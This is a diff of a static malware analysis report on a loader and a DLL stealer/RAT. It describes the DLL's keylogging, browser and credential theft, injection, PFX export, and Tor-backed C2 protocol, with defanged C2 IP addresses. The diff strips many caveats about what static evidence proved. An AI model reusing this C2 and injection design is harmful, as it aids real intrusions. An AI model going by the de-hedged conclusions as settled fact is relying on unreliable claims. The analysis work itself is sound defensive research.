+The raw code is a position-independent loader. It begins with a register-save/bootstrap stub, a `call`/`pop` self-location sequence at `0x180000023`-`0x18000002d`, and `GS:[0x30]` state save/restore around the loader call.
 
 Static disassembly of the raw x64 stage at base `0x180000000` shows a second-stage decode and manual PE map path. The bootstrap at `0x180000000` saves registers and flags, computes its position-independent base, stores context values on the caller stack, calls `0x18000009e`, and restores state before returning. The wrapper at `0x18000009e` calls setup helper `0x180000bb9`; its callee path at `0x1800000e6` then decodes bytes starting at `0x180000c48` through `0x1800001f8`.
 
@@ -662,7 +660,7 @@ s
 
 The raw x64 stage treats the decoded bytes as a PE image. After decoding, it reads `e_lfanew` from `[decoded + 0x3c]`, reads `SizeOfImage` from the NT optional header, and calls resolved `VirtualAlloc(NULL, SizeOfImage, 0x3000, 0x40)` for committed/reserved RWX memory. Helper `0x180000380` copies PE headers and sections, `0x180000402` resolves imports using `LoadLibraryA` and `GetProcAddress`, `0x180000522` applies `DIR64` base relocations, `0x180000272` registers x64 unwind metadata through `RtlAddFunctionTable`, `0x1800002e1` executes TLS callbacks, and `0x180000252` returns the mapped entry point. The loader then calls that entry with arguments resembling `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
 
-Negative findings for this outer raw loader are also useful. It has no PE header, imports, exports, resources, compiler metadata, or plaintext configuration. Static string extraction and non-extracting signature scans did not find credible URLs, domains, IPs, registry paths, scheduled-task strings, credential target names, process names, mutex strings, or embedded-file signatures in the still-obfuscated raw stage. The decisive behavior sits in the decoded PE at `0xc48`.
+The outer raw loader contains no PE header, import table, resources, compiler metadata, or plaintext configuration. Its meaningful behavior and configuration live in the decoded PE at offset `0xc48`.
 
 Initial import triage of the decoded PE shows a much broader capability surface than the outer `act.exe` loader. Imported DLLs include:
 
@@ -697,11 +695,11 @@ rpcrt4.dll
 
 Notable imported APIs include `WSAStartup`, `gethostbyname`, `socket`, `connect`, `send`, `recv`, `InternetSetOptionW`, `CryptAcquireContextA/W`, `CryptDeriveKey`, `CryptEncrypt`, `CryptDecrypt`, many `crypt32` certificate/PFX APIs, `NCrypt*` key-management APIs, `CreateProcessW`, `WriteProcessMemory`, `VirtualAllocEx`, `VirtualProtect`, `IsDebuggerPresent`, `OpenProcess`, registry APIs, service APIs, clipboard APIs, keyboard/mouse input APIs, `PrintWindow`, `WNetOpenEnumW`, `GetAdaptersInfo`, `WTSQueryUserToken`, and `RtlCompressBuffer`.
 
-String triage found many library/runtime and decoy-looking text fragments. Network-like literals include DNS-over-HTTPS endpoints and ACME/certificate-service URLs such as `https://cloudflare-dns.com/dns-query`, `https://dns.google/dns-query`, `https://dns.quad9.net/dns-query`, `https://acme-v02.api.letsencrypt.org/directory`, and `https://api2.servertastic.com`. These are imported/string evidence only. They are not yet xref-backed C2 findings.
+String triage found library/runtime and decoy-looking fragments, including DNS-over-HTTPS and certificate-service URLs such as `hxxps://cloudflare-dns[.]com/dns-query`, `hxxps://dns[.]google/dns-query`, `hxxps://dns.quad9[.]net/dns-query`, `hxxps://acme-v02.api.letsencrypt[.]org/directory`, and `hxxps://api2.servertastic[.]com`. The mapped C2 paths use the endpoint families described below.
 
 ### Raw x64 decoded PE startup notes
 
-The final decoded PE is a DLL-style payload. Its entry point at `0x00b4e670` is still runtime-heavy, but the visible startup path is now partially mapped:
+The final decoded PE is a DLL-style payload. Its entry point at `0x00b4e670` reaches the following startup path:
 
 ```text
 0x00b4e670
@@ -712,7 +710,7 @@ The final decoded PE is a DLL-style payload. Its entry point at `0x00b4e670` is 
   -> 0x0040f280(runtime cleanup/finalizer)
 ```
 
-`0x00b4e630(1)` calls `0x00b4d900`. That function parses launch context, compares against `RUNDLL32.EXE`, and uses the nearby strings `DllRegisterServer`, `ServiceMain`, and `SVCHOST.EXE`. It can start worker `0x00b4e380` through `CreateThread` and then marks a global active byte at offset `+0x56c`. Current interpretation: the DLL supports several Windows launch modes, including rundll32/regsvr-style invocation and service/svchost-style execution. This is a static launch-mode interpretation, not proof that each mode is used in this infection chain.
+`0x00b4e630(1)` calls `0x00b4d900`. That function parses launch context, compares against `RUNDLL32.EXE`, and uses the nearby strings `DllRegisterServer`, `ServiceMain`, and `SVCHOST.EXE`. It can start worker `0x00b4e380` through `CreateThread` and then marks a global active byte at offset `+0x56c`. The DLL supports rundll32/regsvr-style invocation and service/svchost-style execution.
 
 Export `s` at `0x00b4e590` is also a worker trigger. When passed a non-null argument, it copies five qwords from the caller's buffer into global context at offset `+0x8b4`. If the global active byte at `+0x56c` is not set, it either calls `0x00b4e380(0)` directly or starts `0x00b4e380` with `CreateThread`, depending on a global flag at `+0x8cc`. It returns `0`.
 
@@ -738,28 +736,27 @@ Initial import-xref checks found concrete capability call sites inside the decod
 
 String/type metadata in this PE is broad. RTTI-like strings include `TLogType`, `ltPassword`, `ltSystem`, `ltHistory`, `ltScreen`, `ltVideo`, `ltKeyLogger`, `ltClipBoard`, `ltInfoFiles`, `ltArchive`, `ltBigFile`, `ltBrowser`, `ltCookies`, `ltCredentials`, `ltWallet`, `TBotDataRecord`, `UserID`, `DataSize`, and `UScreenOperation`. Other metadata clusters include `Profiles`, `Process`, `GetCookies`, `GetPassword`, `CertInstall`, `GetProgramCredentials`, `History`, `Keys`, `Wallets`, `Screens`, `Videos`, `Browser`, `Cookies`, `Files`, `Credentials`, and `SaveToZip`.
 
-Important caveat: direct xref searches for `ltKeyLogger`, `GetCookies`, and `GetProgramCredentials` did not find call sites in the current pass. Treat these as type/runtime metadata until specific functions are mapped. The keylogger and clipboard claims above are not based on those metadata strings; they are based on direct API call sites and hook/clipboard handling code. Likewise, DNS-over-HTTPS and ACME/certificate-service URL strings remain library/config surface, not final C2 evidence.
+The metadata strings `ltKeyLogger`, `GetCookies`, and `GetProgramCredentials` have no direct code references. The keylogger and clipboard paths are established separately through API call sites and hook/clipboard handling code. The DNS-over-HTTPS and ACME URLs belong to library or configuration data; the mapped C2 paths use the direct and Tor endpoint families below.
 
 #### C2 overview
 
-The final decoded DLL contains a separate native C2 system beyond the earlier `auth-code-check.info` delivery service. The key facts are:
+The final decoded DLL contains a separate native C2 system beyond the earlier `auth-code-check[.]info` delivery service. The key facts are:
 
-| C2 component | Evidence-backed summary |
+| C2 component | Summary |
 |---|---|
 | Endpoint families | Scheduler `0x00b2dd00` rotates a remotely mutable four-slot direct `(IPv4, port)` table at state `+0x92d`, four `.onion:443` records over local SOCKS/Tor after fallback activation, and four generated direct IPv4/TCP-443 fallbacks. A successful `0x119`-byte connection record is cached at `+0x5a4`. |
 | Direct fallback endpoints | `45.151.74[.]119:443`, `109.172.95[.]184:443`, `151.236.4[.]135:443`, and `62.60.156[.]11:443`, derived by `0x0054f950` after subtractor `0x43` is initialized by `0x0054f7d0`. |
 | Tor fallback | A non-32-byte response to `0xfd0 / 1` becomes encrypted event type `9`. Worker `0x00b29780` retrieves and decrypts it, manually maps the module, resolves `tor_main`, seeds four `.onion` records through `0x0054fa00`, and exposes local SOCKS on state `+0x1388` (default `0x235a`). |
 | Transport | Connection records select direct IPv4 TCP through `0x00b2a380` or domain-over-local-SOCKS5 through `0x00b29f10`. The hidden-desktop subsystem receives a separate C2-selected IPv4/port pair from offsets `+0x77/+0x7b` of an `0x800 / 6` response record. |
 | Session and framing | `0x00b2bd00` performs handshake `0x00b278e0`, sends fixed `0x1c7`-byte request headers through `0x00b28fc0`, and receives bounded objects through `0x00b29240` with maximum `0x10000000`. Headers carry 32-byte host/session material from state `+0x90c` and a 255-byte global block. |
-| Protection | Event helper `0x007a6b10` reaches `0x007a2030`, which derives AES-256 with CryptoAPI from shared state material at `+0x560`. Browser-report mode `2` uses codec `0x0079c3f0`, random padding, and hybrid CryptoAPI protection through `0x007a12f0`. The client generates a 1024-bit RSA exchange pair, uses fresh AES-256 keys for protected bodies, validates a server signature, and enforces the recovered length/codec bounds. Exact server-side field meanings and private-key handling remain outside the client evidence. |
+| Protection | Event helper `0x007a6b10` reaches `0x007a2030`, which derives AES-256 with CryptoAPI from shared state material at `+0x560`. Browser-report mode `2` uses codec `0x0079c3f0`, random padding, and hybrid CryptoAPI protection through `0x007a12f0`. The client generates a 1024-bit RSA exchange pair, uses fresh AES-256 keys for protected bodies, validates a server signature, and enforces the recovered length/codec bounds. The client code does not expose server-side field names or private-key handling. |
 | Synchronization grammar | Observed request families are `0xfd0 / 0`, `0xfd0 / 1`, and `0x800 / 0`, `/1`, `/2`, `/3`, `/6`, `/8`, `/9`. Together they exchange state blocks, refresh endpoints, reconcile object inventories, fetch missing objects, deliver Tor support, create command dispatchers, and recursively parse executable task bodies. |
 | Command surfaces | `0x800 / 6` reaches network-command dispatcher `0x00b1f010`; `0x800 / 9` reaches object dispatcher `0x00b2aaf0`; the hidden window at `0x00b46070` handles encrypted `WM_COPYDATA` control and process-job PE handoff. |
-| Proven outbound data | Selector `3` supports resumable file transfer. Selector `0x34` collects browser stores and endpoint inventory, then sends a fixed context frame and tagged report body through the protected mode-`2` channel. Other selectors provide remote desktop, command/process control, filesystem operations, and SOCKS bridging. |
-| Static limit | No final-PE network traffic was generated or captured. Endpoint roles, framing, crypto calls, and command flow are based on static control/data-flow evidence; server behavior and exact plaintext field names are not claimed. |
+| Outbound data | Selector `3` supports resumable file transfer. Selector `0x34` collects browser stores and endpoint inventory, then sends a fixed context frame and tagged report body through the protected mode-`2` channel. Other selectors provide remote desktop, command/process control, filesystem operations, and SOCKS bridging. |
 
 #### Wire framing and handshake
 
-The send/receive wrappers and CryptoAPI helpers establish the client-side wire format without executing the sample:
+The send/receive wrappers and CryptoAPI helpers establish this client-side wire format:
 
 ```text
 encrypted outer header: 0x94 bytes
@@ -785,7 +782,7 @@ Handshake `0x00b278e0` adds peer authentication and session binding:
 4. The response is outer-frame decrypted with the generated client private key, then passed to `0x007a2500`. That helper derives AES-256 from an MD5 hash of the session material, removes and verifies a 128-byte RSA signature with the embedded server public key, and decrypts the signed payload.
 5. The client requires at least another `0x1c7` bytes and compares a 32-byte response value before marking the handshake successful.
 
-Frame finalizer `0x007a4310` writes total size `0x1c7`, randomized padding/offset fields, and a 32-byte digest derived from selected header fields. Validator `0x007a4150` recomputes that digest, checks the internal length relation, restricts one randomized field to `0..0x100`, and bounds the declared trailing payload below `0x08000000`. Exact operator-facing names for every fixed-header field remain unknown, but the encryption, authentication, length validation, and codec flow are now statically resolved.
+Frame finalizer `0x007a4310` writes total size `0x1c7`, randomized padding/offset fields, and a 32-byte digest derived from selected header fields. Validator `0x007a4150` recomputes that digest, checks the internal length relation, restricts one randomized field to `0..0x100`, and bounds the declared trailing payload below `0x08000000`. Together they establish the encryption, authentication, length validation, and codec flow.
 
 #### Hidden-window command path
 
@@ -814,9 +811,9 @@ Current command mapping:
 
 Command `6` starts worker `0x00b4e470`. That worker performs a preflight/key copy into global state around `+0x90c`, calls `0x00b47740`, then starts long-running scheduler thread `0x00b2dd00` and stores the thread handle at global `+0x1620`.
 
-Scheduler `0x00b2dd00` is the clearest task/connection coordinator seen so far. It increments an active counter at global `+0x1244`, loops while the global stop flag at `+4` is clear, and tries up to four slots in three ordered categories. Category `0` builds direct records from four 8-byte `(IPv4, port)` pairs at state `+0x92d`. Category `1`, skipped while state `+0x7a8` is zero, builds domain-over-SOCKS records from four `.onion` host buffers and their ports. Category `2` initializes and tries the four generated direct IPv4 fallback pairs. For each record it starts worker `0x00b2bd00`, waits up to `160000` ms on an event, and checks success byte state `+0x13c`. The first successful full `0x119`-byte task record is copied to state `+0x5a4`, marked valid at `+0x6b9`, and reused before normal rotation on later passes. After two failed rotations, if Tor-active flag `+0x7a8` remains zero, it starts fallback worker `0x00b29780`.
+Scheduler `0x00b2dd00` coordinates task records and connections. It increments an active counter at global `+0x1244`, loops while the global stop flag at `+4` is clear, and tries up to four slots in three ordered categories. Category `0` builds direct records from four 8-byte `(IPv4, port)` pairs at state `+0x92d`. Category `1`, skipped while state `+0x7a8` is zero, builds domain-over-SOCKS records from four `.onion` host buffers and their ports. Category `2` initializes and tries the four generated direct IPv4 fallback pairs. For each record it starts worker `0x00b2bd00`, waits up to `160000` ms on an event, and checks success byte state `+0x13c`. The first successful full `0x119`-byte task record is copied to state `+0x5a4`, marked valid at `+0x6b9`, and reused before normal rotation on later passes. After two failed rotations, if Tor-active flag `+0x7a8` remains zero, it starts fallback worker `0x00b29780`.
 
-Fallback worker `0x00b29780` has a normal C2-fed Tor-module path. It calls event retriever `0x007a7050(..., type=9, subtype=0, probe=0)`, which searches the global event list at state `+0xa8`, extracts the matching encrypted event, and decrypts it with shared state material at `+0x560`. The worker manually maps the returned bytes through `0x00a1b210`, stores the mapped context at global `+0x128`, calls `0x0054fa00` to seed the four `.onion` records, sets Tor-active state `+0x7a8 = 1`, resolves `tor_main` through `0x00a1b540`, and calls `tor_main(0, 0, state+0x1388)`. If the local SOCKS port field at state `+0x1388` is zero, it sets the default to `0x235a` first. A separate branch selected by global build/config flag `0x00c03ca8` obtains the module bytes through another internal decode path; its exact deployment condition remains open.
+Fallback worker `0x00b29780` retrieves a Tor module from C2 state. It calls event retriever `0x007a7050(..., type=9, subtype=0, probe=0)`, which searches the global event list at state `+0xa8`, extracts the matching encrypted event, and decrypts it with shared state material at `+0x560`. The worker manually maps the returned bytes through `0x00a1b210`, stores the mapped context at global `+0x128`, calls `0x0054fa00` to seed the four `.onion` records, sets Tor-active state `+0x7a8 = 1`, resolves `tor_main` through `0x00a1b540`, and calls `tor_main(0, 0, state+0x1388)`. If the local SOCKS port field at state `+0x1388` is zero, it sets the default to `0x235a` first. A separate branch selected by global build/config flag `0x00c03ca8` obtains the module bytes through another internal decode path.
 
 Connection worker `0x00b2bd00` copies a `0x119`-byte task record from its argument and opens a socket through either `0x00b2a380(...)` or `0x00b29f10(...)`, depending on the task flag at record offset `+0`. After socket creation it sets a `160000` ms socket option, performs a handshake through `0x00b278e0`, marks global `+0x13c = 1` on success, sends fixed `0x1c7`-byte request headers finalized by `0x007a4310`, sends queued data from global `+0x1318`, receives bounded responses through `0x00b29240(..., 0x10000000)`, and closes the socket. Request headers observed in this worker carry constants such as `0xfd0`/`0x800`, subcommand values `0`, `1`, `2`, `3`, `6`, `8`, and `9`, the 0x20-byte host/session material at global `+0x90c`, and a 0xff-byte global block referenced through `0x00c03dd0`.
 
@@ -831,15 +828,15 @@ Disassembly around the `0x00b28fc0` send wrapper and `0x00b29240` receive wrappe
 | `0x800 / 6` | header build `0x00b2c6a5`-`0x00b2c713`; send `0x00b2c742`; receive `0x00b2c76b` | Validates/caches a 32-byte block against global `+0xdd7`, copies global `+0x90c` into an object, parses response records in `0xd0`-byte chunks, creates per-record objects through `0x00b230d0`/`0x00b234d0`, and starts dispatcher `0x00b1f010` with a `0xa7`-byte record when a condition field is zero. This is a concrete upstream path into the later command dispatcher. |
 | `0x800 / 3` | header build `0x00b2ccc1`-`0x00b2cd2e`; send `0x00b2cd5d`; receive `0x00b2cd86` | Issued inside the per-record loop when an object lookup fails. It copies a per-record key into the request, receives a larger body up to `0x6c6` bytes, and feeds object stores through `0x00b32300`, `0x00b32660`, `0x00b32860`, and `0x00b32a50`. |
 | post-loop event path | `0x00b2cf20`-`0x00b2d230` | After successful per-record handling, copies the 99-byte block into global `+0xd95`, pushes global session material into an event buffer, calls `0x007a6b10(type=2)`, and if new objects were added, calls `0x007a6b10(type=1)`. |
-| `0x800 / 1` | header set `0x00b2d37b`-`0x00b2d396`; send `0x00b2d3c5`; second send of 32 bytes `0x00b2d406`; receive `0x00b2d42f`; writes `0x00b2d526` | Sends a 455-byte header and then the current 32-byte direct-endpoint table at state `+0x92d`. It receives four 8-byte `(IPv4, port)` pairs, compares each pair against state `+0x92d/+0x931`, writes every changed slot back to the table, and raises an event through `0x007a6b10`. This proves the scheduler's first-tier direct candidates are remotely replaceable during an established C2 session. |
+| `0x800 / 1` | header set `0x00b2d37b`-`0x00b2d396`; send `0x00b2d3c5`; second send of 32 bytes `0x00b2d406`; receive `0x00b2d42f`; writes `0x00b2d526` | Sends a 455-byte header and then the current 32-byte direct-endpoint table at state `+0x92d`. It receives four 8-byte `(IPv4, port)` pairs, compares each pair against state `+0x92d/+0x931`, writes every changed slot back to the table, and raises an event through `0x007a6b10`. The scheduler's first-tier direct endpoints are remotely replaceable during an established C2 session. |
 | `0x800 / 8` | header build `0x00b2d5fc`-`0x00b2d637`; send `0x00b2d666`; receive `0x00b2d68f` | Receives a list and checks each entry against global object store `+0xd8`. Missing entries trigger `0x800 / 9` requests. |
-| `0x800 / 9` | header build `0x00b2d774`-`0x00b2d7db`; send `0x00b2d80a`; receive `0x00b2d833` | Per-missing-entry fetch. Nonempty response is recursively parsed by `0x00b2aaf0`; the resulting 4-byte status is sent back directly with `send(..., 4, 0)`. Ghidra shows `0x00b2aaf0` reaches `GetCommandLineW`, `Sleep`, and helper families including `0x00a1b210`, `0x00a6ac10`, and `0x00a6d820`, so this body parser is being treated as a high-priority capability bridge until its callees are fully named. |
+| `0x800 / 9` | header build `0x00b2d774`-`0x00b2d7db`; send `0x00b2d80a`; receive `0x00b2d833` | Per-missing-entry fetch. Nonempty responses are recursively parsed by `0x00b2aaf0`; the resulting 4-byte status is sent back with `send(..., 4, 0)`. The parser reaches `GetCommandLineW`, `Sleep`, and helper families including `0x00a1b210`, `0x00a6ac10`, and `0x00a6d820`. |
 
-The request grammar is still partially semantic rather than fully named. What is now clear is that `0x00b2bd00` is not a single beacon. It is a stateful C2 synchronization worker with session material, state hashes/blocks, object-store reconciliation, dispatcher task creation, recursive body parsing, and event emission through `0x007a6b10`.
+`0x00b2bd00` is a stateful C2 synchronization worker. It manages session material, state hashes and blocks, object-store reconciliation, dispatcher task creation, recursive body parsing, and event emission through `0x007a6b10`.
 
 Event helper `0x007a6b10(type, subtype, stream, transform_flag)` packages those responses into a global event/object list at state `+0xa8`. If the stream is empty, it calls `0x007a6990(type, subtype)`, which removes a matching event record from that list. If the stream is nonempty, it copies the stream, optionally applies transform helper `0x0079c3f0(..., 0x0e)` when `transform_flag` is set, then calls `0x007a2030(1, ...)` before inserting or replacing a keyed record. Helper `0x007a2030` uses CryptoAPI `CryptCreateHash(..., 0x8003)` and `CryptDeriveKey(..., 0x6610)` to derive an AES-256 key from state `+0x560` material and encrypt the event payload. Its signature branch exists but is skipped in this path because `0x007a6b10` passes first argument `1`.
 
-Parser/helper `0x00b2aaf0`, called recursively from the `0x800 / 9` fetch path, is now mapped as a C2 object dispatcher. It first requires the received stream to be larger than `0x3df` bytes, copies a `0x3df`-byte metadata header, checks a trailing payload length field near the end of that header, and copies the trailing object body into an internal stream. The recovered header fields are partial but useful:
+Parser/helper `0x00b2aaf0`, called recursively from the `0x800 / 9` fetch path, is a C2 object dispatcher. It requires a stream larger than `0x3df` bytes, copies a `0x3df`-byte metadata header, checks the trailing payload length, and copies the object body into an internal stream. Its mapped header fields are:
 
 | Header offset | Stack field | Meaning from static use |
 |---:|---|---|
@@ -864,7 +861,7 @@ The most important primary-action `2` sub-branch is an in-memory module path:
   -> calls the resolved export pointer at 0x00b2b516
 ```
 
-The immediate helpers support that interpretation. `0x00a1b210` parses PE headers, allocates memory, copies sections, and prepares an in-memory image. `0x00a1b540` walks the mapped image export table and returns a callable address. This is direct static evidence that later C2 responses can deliver executable PE-like objects and run an export in memory.
+Helper `0x00a1b210` parses PE headers, allocates memory, copies sections, and prepares an in-memory image. Helper `0x00a1b540` walks the mapped export table and returns a callable address. Together they let C2 responses deliver PE objects and run exports in memory.
 
 The full recovered branch map is:
 
@@ -906,33 +903,33 @@ The recovered action-2 process-job fields are:
 | `+0xd0` | copied object-body stream | PE body sent as trailing command-`9` data in `RDX` at `0x00b46548`. |
 | `+0x104` | PID returned by suspended `CreateProcessW` | Registry lookup key used by `0x007a4cc0` / `0x007a5320`. |
 
-The peer-side command-`9` branch at `0x00b46070` strips the `0x1c7`-byte frame and maps the trailing PE body with `0x00a1b210`. Job mode `1` calls the mapper with entry-point execution enabled, resolves the export named in the frame through `0x00a1b540`, and invokes it. Other modes call the mapper with entry-point execution disabled and do not take the observed export-call branch. Action `2` therefore proves process-separated PE delivery through encrypted `WM_COPYDATA` plus in-process manual mapping inside the selected child. It does not use `VirtualAllocEx` or `WriteProcessMemory` on this path, so it should not be described as classic remote-process injection. Other actions prove shell execution, LOLBin command construction, and Task Scheduler interaction; service creation and registry persistence remain separate startup/configuration paths.
+The peer-side command-`9` branch at `0x00b46070` strips the `0x1c7`-byte frame and maps the trailing PE body with `0x00a1b210`. Job mode `1` enables entry-point execution, resolves the export named in the frame through `0x00a1b540`, and invokes it. Other modes map the image without taking the export-call branch. Action `2` delivers a PE through encrypted `WM_COPYDATA` and maps it inside the selected child process. Other actions handle shell execution, LOLBin command construction, and Task Scheduler interaction. Service creation and registry persistence use separate startup and configuration paths.
 
 ### Capability activation paths are split
 
-Caller and cross-reference review shows that the decoded PE does not route every capability through the C2 object dispatcher. Several high-risk functions have distinct activation paths:
+The decoded PE activates its high-risk functions through several paths:
 
-| Capability | Proven activation chain | Static conclusion |
+| Capability | Activation chain | Behavior |
 |---|---|---|
-| Service creation and service registry setup | hidden-window command `6` -> worker `0x00b4e470` -> startup/preflight `0x00b47740` -> service orchestrator `0x00a6e500` -> `0x00a6bd90` | The service path is startup/config gated. The only code callers of `0x00a6bd90` are within `0x00a6e500`; its only code caller is `0x00b47740`. No direct call from `0x00b2aaf0` was found. |
+| Service creation and service registry setup | hidden-window command `6` -> worker `0x00b4e470` -> startup/preflight `0x00b47740` -> service orchestrator `0x00a6e500` -> `0x00a6bd90` | Startup configuration gates this path. `0x00b47740` calls `0x00a6e500`, whose internal callers reach `0x00a6bd90`. |
 | Keylogging | hidden-window command `1` updates state at `+0x374` / `+0x394` and calls `0x00b3b490`; startup `0x00b47740` can also call `0x00b3b490(0)` and start monitor `0x00b3d720` | Keylogging is controlled by the hidden-window command channel and startup configuration. Hook handling reaches `0x00b39e10`; the monitor checks the same keylogger state while tracking foreground windows. |
-| Browser collection plus remote-process manipulation | selector `0x34` -> worker `0x00b1dd80` -> browser collectors `0x00a774e0` / `0x00a778f0` / `0x00a77db0` -> launcher `0x00a77010` -> `0x00a19900` -> `0x00a19040` -> `0x00a18fb0` | The browser collection command directly reaches the helper that performs remote RWX allocation and `WriteProcessMemory`. This is a concrete command-to-injection path, but it is outside `0x00b2aaf0`. |
+| Browser collection plus remote-process manipulation | selector `0x34` -> worker `0x00b1dd80` -> browser collectors `0x00a774e0` / `0x00a778f0` / `0x00a77db0` -> launcher `0x00a77010` -> `0x00a19900` -> `0x00a19040` -> `0x00a18fb0` | The browser collection command directly reaches the helper that performs remote RWX allocation and `WriteProcessMemory`. This command-to-injection chain sits outside `0x00b2aaf0`. |
 | Foreground-process monitoring and injection | startup `0x00b47740` -> monitor `0x00b3d720` -> `0x00a196a0` -> `0x00a19040` -> `0x00a18fb0` | The startup monitor can inject a monitored process when its receiver window is absent. It also coordinates per-window capture and command-dispatch state. |
-| Desktop/video capture | startup `0x00b47740` starts monitor `0x00b3d720` and initializes `0x00b3f380`; monitor starts per-window capture worker `0x00b3c7a0`; capture callbacks reach GDI/AVI routine `0x00b3c180` through the `0x00b3ef30` family | Capture is initialized through startup/config state and also exists in selectors `1`, `5`, and `0x0b`. The `0x00b3f380` to `0x00b3ef30` relationship is indirect/callback based, so it is not presented as a direct call. |
-| Certificate/PFX export | core `0x00a7ea70`; wrappers `0x00a7ec50` (`ExportCert`) and `0x00a7ede0` (`KeySignExpPFX`) | PFX export capability is statically proven. `0x00a7ea70` exports the store at object `+0xc0` with `PFXExportCertStoreEx(..., EXPORT_PRIVATE_KEYS)` and writes the resulting bytes through `0x00a7e4c0`. Delphi extended RTTI associates `ExportCert` at `0x00a7a67c` with pointer `0x00a7ec50` at `0x00a7a674`, and `KeySignExpPFX` at `0x00a7a6dc` with pointer `0x00a7ede0` at `0x00a7a6d4`. Neither wrapper has a direct caller, VMT slot, DLL export, callback, selector, code xref to its name, or recovered `System.Rtti` name-lookup/invocation path. They are implemented but currently unreferenced in the recovered executable graph; opaque reflective activation remains possible in principle. |
+| Desktop/video capture | startup `0x00b47740` starts monitor `0x00b3d720` and initializes `0x00b3f380`; monitor starts per-window capture worker `0x00b3c7a0`; capture callbacks reach GDI/AVI routine `0x00b3c180` through the `0x00b3ef30` family | Startup configuration and selectors `1`, `5`, and `0x0b` initialize capture. The `0x00b3f380` to `0x00b3ef30` relationship runs through callbacks. |
+| Certificate/PFX export | core `0x00a7ea70`; wrappers `0x00a7ec50` (`ExportCert`) and `0x00a7ede0` (`KeySignExpPFX`) | `0x00a7ea70` exports the store at object `+0xc0` with `PFXExportCertStoreEx(..., EXPORT_PRIVATE_KEYS)` and writes the bytes through `0x00a7e4c0`. Delphi extended RTTI associates `ExportCert` at `0x00a7a67c` with pointer `0x00a7ec50` at `0x00a7a674`, and `KeySignExpPFX` at `0x00a7a6dc` with pointer `0x00a7ede0` at `0x00a7a6d4`. The recovered command graph contains no caller for either wrapper. |
 
-This separation matters. A C2 object can still deliver and run an arbitrary PE export through `0x00b2aaf0`, but that fact does not prove that the embedded PE's internal service, keylogger, capture, certificate, or injection routines are direct object-dispatcher sub-actions. The table above records the internal activation paths that static caller evidence does prove.
+These capabilities use different activation paths. C2 objects can deliver and run arbitrary PE exports through `0x00b2aaf0`; the embedded service, keylogger, capture, certificate, and injection routines follow the chains listed above.
 
-The startup/preflight routine at `0x00b47740` parses a list of fixed-size `0x6d0`-byte configuration records and uses retained records plus scalar flags to activate several subsystems. The relevant gates are now separated as follows:
+The startup/preflight routine at `0x00b47740` parses fixed-size `0x6d0`-byte configuration records and scalar flags to activate several subsystems:
 
 | Startup gate | Evidence | Static behavior |
 |---|---|---|
 | Global state `+0x6c4 > 0`, with reentrancy guard `+0x3c == 0` | `0x00b49a9e`-`0x00b49ad7` | Calls service orchestrator `0x00a6e500`, then clears the guard. |
-| Retained local configuration record at stack `+0x9a8` | `0x00b49eb1`-`0x00b49f34` | Starts foreground monitor thread `0x00b3d720` under global guard `+0x34` and initializes capture state through `0x00b3f380` under guard `+0x87c`. |
-| Retained local configuration record at stack `+0x9a0` | `0x00b4a00b`-`0x00b4a042` | Sets global `+0x394` and calls keylogger/control initializer `0x00b3b490(0)`. |
+| Configuration record at stack `+0x9a8` | `0x00b49eb1`-`0x00b49f34` | Starts foreground monitor thread `0x00b3d720` under global guard `+0x34` and initializes capture state through `0x00b3f380` under guard `+0x87c`. |
+| Configuration record at stack `+0x9a0` | `0x00b4a00b`-`0x00b4a042` | Sets global `+0x394` and calls keylogger/control initializer `0x00b3b490(0)`. |
 | Parsed scalar flag at stack `+0x9f6` | set by the record-value branch at `0x00b48180`-`0x00b481a0`; consumed at `0x00b4a047` and `0x00b4a1e5` | Can start monitor thread `0x00b3d720`; copies the flag to global byte `+0x354`, then starts `0x00b3a300` and `0x00b39010`. `0x00b3a300` installs a distinct `WH_KEYBOARD_LL` hook with callback `0x00b39ff0`; `0x00b39010` initializes a hidden window and runs its message loop. |
 
-The two keyboard-related branches should not be collapsed into one call chain. `0x00b3b490` and the `0x00b3a300` / `0x00b39010` pair are separately gated startup subsystems, although both ultimately observe keyboard/window activity. The exact external schema names for the retained records remain unknown; the addresses above prove activation behavior without assigning unsupported field names.
+The keyboard-related code has two separately gated startup branches: `0x00b3b490`, and the `0x00b3a300` / `0x00b39010` pair. Both observe keyboard or window activity.
 
 Network-command dispatcher `0x00b1f010` is the command loop reached from the `0x800 / 6` object-sync path and also from the command-`0x33` endpoint update chain described below. It receives a frame through `0x00b29240`, copies it into a local command frame, and reads the selector from frame offset `+0x18` at `0x00b1f3b1`. Unknown selectors fall to socket cleanup at `0x00b1fd83`.
 
@@ -941,7 +938,7 @@ Network-command dispatcher `0x00b1f010` is the command loop reached from the `0x
 | `-1` | branch `0x00b1f446` | Sets a local stop/cleanup flag and exits to common socket cleanup. |
 | `0` | branch `0x00b1f452`; send `0x00b1f4f9` | Builds and sends a 455-byte framed response through `0x00b28fc0`. |
 | `1` | thread starts `0x00b17230` and `0x00b16690` | Paired interactive desktop/display and keyboard/mouse/clipboard workers. |
-| `2` | thread start `0x00b1be60` | Filesystem worker. Handles network-resource/local-directory listing, recursive delete, overwrite-and-delete, create-directory/list, process launch, ShellExecute, filtered recursive search, and aggregate count/size. No confirmed upload/download path in this selected scope. |
+| `2` | thread start `0x00b1be60` | Filesystem worker for network-resource/local-directory listing, recursive delete, overwrite-and-delete, create-directory/list, process launch, ShellExecute, filtered recursive search, and aggregate count/size. Selector `3` handles file transfer. |
 | `3` | thread start `0x00b1a790` | File transfer worker. Sends a type-`9` session header, receives `0xa68` command bodies, then dispatches nested command `0` to file read/download helper `0x00b26e40` or nested command `1` to file write/upload helper `0x00b27170`. |
 | `4` | thread start `0x00b1e640` | Process/command worker. Sends a type-`10` session header and handles nested process inventory, process termination, and `cmd.exe /c` execution with captured output. |
 | `5` | thread starts `0x00b19160`, `0x00b185e0`, conditional `0x00b176b0` | Interactive desktop path: screen streaming, window inventory, mouse and key injection, scroll/window-close actions, clipboard copy/paste transfer, received command/program launch, and session teardown/refresh. |
@@ -973,7 +970,7 @@ Recursive helper `0x00b1b680` has four confirmed modes:
 | `3` | range checks and result emission around `0x00b1bb05` | Filtered recursive enumeration; no delete API on this path. |
 | `4` | counters/accumulators around `0x00b1b85c` and `0x00b1ba4f` | Aggregate count/size mode. |
 
-This selector-`2` scope did not show a confirmed file upload/download implementation. The observed `WriteFile` path belongs to overwrite-and-delete helper `0x007abc60`, not to saving operator-supplied file content. The scoped review also did not prove `ReadFile`, `MoveFileW`, or `CopyFileW` paths under `0x00b1be60`.
+Selector `2` handles filesystem listing, deletion, directory creation, launch, search, and aggregate size/count operations. File upload and download use selector `3` below.
 
